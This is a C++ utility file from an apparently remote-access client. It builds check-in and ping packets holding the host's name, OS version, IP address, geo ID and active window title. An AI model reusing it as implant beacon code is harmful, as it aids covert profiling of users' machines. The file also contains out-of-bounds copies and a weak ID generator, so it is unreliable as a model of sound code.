//
// Created by LUNAFE on 2022-02-04.
//

#include "util.h"

void util::GenId(char *buf, int len) {
    static const char kAlphaNum[] =
            "0123456789"
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "abcdefghijklmnopqrstuvwxyz";
    srand((unsigned) time(NULL));
    for (int i = 0; i < len - 1; ++i) {
        buf[i] = kAlphaNum[rand() % (sizeof(kAlphaNum) - 1)];
    }
    buf[len - 1] = 0;
}

void util::Trim(wchar_t *src, int index, wchar_t *dst) {
    for (int i = 0; i < (wcslen(src) * 2) - (index * 2); i++) {
        dst[i] = src[i + (index)];
    }
}

void util::InitRetrieveInfo(struct INFO *info) {
    wchar_t computer_name[32];
    event_handler::GetComputerName(computer_name);
    char computer_name_[64];
    WcharToChar(computer_name_, computer_name);
    memmove(info->computer_name, computer_name_, sizeof(computer_name_));

    wchar_t os_version[16];
    event_handler::GetOsVersion(os_version);
    char os_version_[32];
    WcharToChar(os_version_, os_version);
    memmove(info->os_version, os_version_, sizeof(os_version_));

    wchar_t local_ip[16];
    event_handler::GetIp(local_ip);
    char local_ip_[32];
    WcharToChar(local_ip_, local_ip);
    memmove(info->ip_address, local_ip_, sizeof(local_ip_));

    wchar_t active_window[128];
    event_handler::GetActiveWindow(active_window);
    char active_window_[256];
    WcharToChar(active_window_, active_window);
    memmove(info->window_title, active_window_, sizeof(active_window_));

    wchar_t geo_id[8];
    event_handler::GetGeoId(geo_id);
    char geo_id_[16];
    WcharToChar(geo_id_, geo_id);
    memmove(info->geo_id, geo_id_, sizeof(geo_id_));
}

void util::MakeInfo(packet *packet_) {
    struct INFO init_info;
    util::InitRetrieveInfo(&init_info);

    packet_->set_type(PACKET_TYPE::INFO);

    char id[16];
    util::GenId(id, 16);
    packet_->set_task_id(id);

    packet_->set_data((char *) &init_info);

    packet_->set_current_index(0);
    packet_->set_final_index(0);
}

void util::MakePong(packet *packet_) {
    packet_->set_type(PACKET_TYPE::PING);

    char id[16];
    util::GenId(id, 16);
    packet_->set_task_id(id);

    wchar_t window_title[128];
    event_handler::GetActiveWindow(window_title);
    char window_title_[256];
    WcharToChar(window_title_, window_title);
    packet_->set_data(window_title_);

    packet_->set_current_index(0);
    packet_->set_final_index(0);
}

void util::CharToWchar(wchar_t *dest, char *src) {
    int w_size = MultiByteToWideChar(CP_UTF8, 0, src, -1, NULL, NULL);
    MultiByteToWideChar(CP_UTF8, 0, src, strlen(src) + 1, dest, w_size);
}

void util::WcharToChar(char *dest, wchar_t *src) {
    int c_size = WideCharToMultiByte(CP_UTF8, 0, src, -1, NULL, 0, NULL, NULL);
    WideCharToMultiByte(CP_UTF8, 0, src, -1, dest, c_size, NULL, NULL);
}
